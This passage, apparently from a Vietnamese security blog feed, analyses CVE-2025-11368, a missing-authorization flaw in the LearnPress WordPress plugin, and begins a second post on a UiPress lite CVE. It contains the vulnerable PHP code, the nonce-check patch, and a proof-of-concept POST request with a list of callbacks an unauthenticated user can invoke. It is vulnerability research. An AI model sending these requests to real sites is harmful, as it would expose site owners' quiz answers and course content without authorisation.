}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh∆∞ v·∫≠y, API n√†y c√≥ endpoint: &lt;code&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/code&gt;, callback &lt;code&gt;get_content&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω request ƒë·∫øn.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_content( WP_REST_Request $request ): LP_REST_Response {&#xA;  $response = new LP_REST_Response();&#xA;&#xA;  try {&#xA;    $params = $request-&amp;gt;get_params();&#xA;&#xA;    if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;      ! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;      throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    // @var array $args&#xA;    $args     = $params[&amp;#39;args&amp;#39;];&#xA;    $callBack = $params[&amp;#39;callback&amp;#39;];&#xA;    if ( $request-&amp;gt;get_method() === &amp;#39;GET&amp;#39; ) {&#xA;      $args     = LP_Helper::json_decode( $params[&amp;#39;args&amp;#39;], true );&#xA;      $callBack = LP_Helper::json_decode( $params[&amp;#39;callback&amp;#39;], true );&#xA;    }&#xA;&#xA;    if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;      empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;      throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    $class  = $callBack[&amp;#39;class&amp;#39;];&#xA;    $method = $callBack[&amp;#39;method&amp;#39;];&#xA;    $data   = null;&#xA;&#xA;    // Security: check callback is registered.&#xA;    $allow_callbacks = apply_filters(&#xA;      &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;      []&#xA;    );&#xA;    $callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;    if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;      throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;    }&#xA;&#xA;    // Check class and method is callable.&#xA;    if ( is_callable( [ $class, $method ] ) ) {&#xA;      $data = call_user_func( [ $class, $method ], $args );&#xA;    } else {&#xA;      throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;    }&#xA;&#xA;    if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;      throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    $response-&amp;gt;status  = &amp;#39;success&amp;#39;;&#xA;    $response-&amp;gt;message = &amp;#39;Success!&amp;#39;;&#xA;    $response-&amp;gt;data    = $data;&#xA;  } catch ( Throwable $e ) {&#xA;    $response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;    $response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;  }&#xA;&#xA;  return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n &lt;code&gt;callback&lt;/code&gt; v√† &lt;code&gt;args&lt;/code&gt; t·ª´ request, decode JSON n·∫øu l√† GET, ki·ªÉm tra &lt;code&gt;callback&lt;/code&gt; c√≥ ƒë·ªß &lt;code&gt;class&lt;/code&gt; v√† &lt;code&gt;method&lt;/code&gt;, t·∫°o chu·ªói &lt;code&gt;class:method&lt;/code&gt; v√† ƒë·ªëi chi·∫øu v·ªõi danh s√°ch callback h·ª£p l·ªá do filter tr·∫£ v·ªÅ; n·∫øu kh√¥ng c√≥ trong danh s√°ch th√¨ b√°o l·ªói, n·∫øu c√≥ th√¨ ki·ªÉm tra class‚Äìmethod c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c v√† th·ª±c thi &lt;code&gt;call_user_func&lt;/code&gt; v·ªõi &lt;code&gt;$args&lt;/code&gt;, nh·∫≠n v·ªÅ &lt;code&gt;$data&lt;/code&gt; v√† tr·∫£ trong response.&lt;/p&gt;&#xA;&lt;p&gt;H√†ng lo·∫°t c√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho filter &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; th√¥ng qua h√†m &lt;code&gt;add_filter&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;ƒêƒÉng k√Ω callback cho filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;ƒêƒÉng k√Ω callback cho filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34; height=&#34;948&#34; width=&#34;793&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;ƒêƒÉng k√Ω callback cho filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n m·∫£ng &lt;code&gt;$callbacks&lt;/code&gt; hi·ªán c√≥, sau ƒë√≥ th√™m v√†o hai chu·ªói d·∫°ng &lt;code&gt;T√™nClass:method&lt;/code&gt; c·ªßa class hi·ªán t·∫°i, r·ªìi tr·∫£ l·∫°i m·∫£ng ƒë√≥ ƒë·ªÉ WordPress s·ª≠ d·ª•ng l√†m danh s√°ch callback h·ª£p l·ªá. Khi debug, ta s·∫Ω th·∫•y to√†n b·ªô c√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;Danh s√°ch c√°c callback h·ª£p l·ªá&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;Danh s√°ch c√°c callback h·ª£p l·ªá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34; height=&#34;869&#34; width=&#34;955&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh s√°ch c√°c callback h·ª£p l·ªá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng ph√°t sinh do API kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn (capability/permission) n√†o.&lt;/strong&gt; ƒêi·ªÅu n√†y cho ph√©p m·ªçi ng∆∞·ªùi d√πng ‚Äì k·ªÉ c·∫£ kh√¥ng c√≥ quy·ªÅn qu·∫£n tr·ªã ‚Äì g·ªçi v√†o endpoint v√† y√™u c·∫ßu th·ª±c thi b·∫•t k·ª≥ callback n√†o n·∫±m trong danh s√°ch callback h·ª£p l·ªá, d√π nh·ªØng callback ƒë√≥ l·∫Ω ra ch·ªâ d√†nh cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v4.3.0)&lt;/strong&gt; b·ªï sung v√†o h√†m &lt;code&gt;get_content&lt;/code&gt; b∆∞·ªõc x√°c th·ª±c quy·ªÅn b·∫±ng c√°ch ki·ªÉm tra &lt;code&gt;X-WP-Nonce&lt;/code&gt; g·ª≠i k√®m request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $request-&amp;gt;get_header( &amp;#39;X-WP-Nonce&amp;#39; ), &amp;#39;wp_rest&amp;#39; ) ) {&#xA;  throw new Exception( &amp;#39;Error: invalid nonce!&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu nonce kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng kh·ªõp v·ªõi action &lt;code&gt;wp_rest&lt;/code&gt;, request s·∫Ω b·ªã ch·∫∑n ngay, ngƒÉn ng∆∞·ªùi d√πng kh√¥ng c√≥ quy·ªÅn truy c·∫≠p v√†o c√°c callback v·ªën ch·ªâ d√†nh cho admin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#39; alt=&#34;Diff&#34; height=&#34;790&#34; width=&#34;1863&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Request includes callback (class &amp;#43; method) and args (lesson, quiz, material IDs...)&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;API receives request ‚Üí invokes get_content()&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;permission_callback = __return_true ‚Üí no capability checks&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;get_content() validates params but performs no permission or capability validation&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Callback is valid but intended for admin-only template rendering&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;API executes the method using call_user_func([class, method], args)&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;Sensitive data is returned to the attacker through the REST API&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request v·ªõi Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/lp/v1/load_content_via_ajax HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;callback[class]=LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&amp;amp;callback[method]=render_list_items_not_assign&amp;amp;args[quiz_id]=483&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34; height=&#34;807&#34; width=&#34;1315&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Danh s√°ch c√°c callback h·ª£p l·ªá kh√°c:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác endpoint REST API &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn truy c·∫≠p&lt;/strong&gt;, cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c g·ªçi tr·ª±c ti·∫øp c√°c callback n·ªôi b·ªô v·ªën ch·ªâ d√†nh cho admin. Th√¥ng qua vi·ªác cung c·∫•p ID h·ª£p l·ªá, attacker c√≥ th·ªÉ truy xu·∫•t &lt;strong&gt;curriculum&lt;/strong&gt;, &lt;strong&gt;quiz&lt;/strong&gt;, &lt;strong&gt;ƒë√°p √°n&lt;/strong&gt;, v√† c√°c &lt;strong&gt;n·ªôi dung gi√°o tr√¨nh nh·∫°y c·∫£m&lt;/strong&gt;. B·∫£n v√° 4.3.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch th√™m ki·ªÉm tra &lt;strong&gt;X-WP-Nonce&lt;/strong&gt;, ngƒÉn truy c·∫≠p tr√°i ph√©p v√†o c√°c callback nh·∫°y c·∫£m.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback = __return_true&lt;/strong&gt; l√† nguy√™n nh√¢n c·ªët l√µi d·∫´n ƒë·∫øn Broken Access Control.&lt;/li&gt;&#xA;&lt;li&gt;Cho ph√©p g·ªçi callback n·ªôi b·ªô m√† kh√¥ng x√°c th·ª±c quy·ªÅn d·∫´n ƒë·∫øn &lt;strong&gt;l·ªô d·ªØ li·ªáu nh·∫°y c·∫£m&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;C√°c callback LearnPress ƒë∆∞·ª£c thi·∫øt k·∫ø cho m√¥i tr∆∞·ªùng admin nh∆∞ng l·∫°i ph∆°i b√†y qua API c√¥ng khai.&lt;/li&gt;&#xA;&lt;li&gt;Bi·ªán ph√°p kh·∫Øc ph·ª•c hi·ªáu qu·∫£ l√† b·ªï sung ki·ªÉm tra &lt;strong&gt;wp_verify_nonce&lt;/strong&gt; v√† r√†ng bu·ªôc quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;REST API trong WordPress c·∫ßn lu√¥n c√≥ &lt;strong&gt;capability checks&lt;/strong&gt; khi x·ª≠ l√Ω c√°c h√†nh ƒë·ªông quan tr·ªçng ho·∫∑c nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-plugin-4-2-9-4-missing-authorization-to-unauthenticated-arbitrary-callback-execution-to-information-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11815 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-10-cve-2025-11815/</link>
      <pubDate>Wed, 10 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-10-cve-2025-11815/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | &lt;strong&gt;plugin&lt;/strong&gt; t·∫°o &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt; v√† &lt;strong&gt;pages&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; d·ªÖ d√†ng b·ªã &lt;strong&gt;t·∫•n c√¥ng&lt;/strong&gt; d·∫´n ƒë·∫øn &lt;strong&gt;s·ª≠a ƒë·ªïi d·ªØ li·ªáu tr√°i ph√©p&lt;/strong&gt; do thi·∫øu &lt;strong&gt;ki·ªÉm tra capability&lt;/strong&gt; trong &lt;strong&gt;h√†m uip_save_site_option()&lt;/strong&gt; ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;3.5.08&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c&lt;/strong&gt;, v·ªõi quy·ªÅn &lt;strong&gt;Subscriber-level&lt;/strong&gt; tr·ªü l√™n, thay ƒë·ªïi t√πy √Ω &lt;strong&gt;c√†i ƒë·∫∑t plugin&lt;/strong&gt;. C√°c &lt;strong&gt;h√†nh ƒë·ªông AJAX&lt;/strong&gt; kh√°c c≈©ng b·ªã ·∫£nh h∆∞·ªüng.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11815&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11815&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.09&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 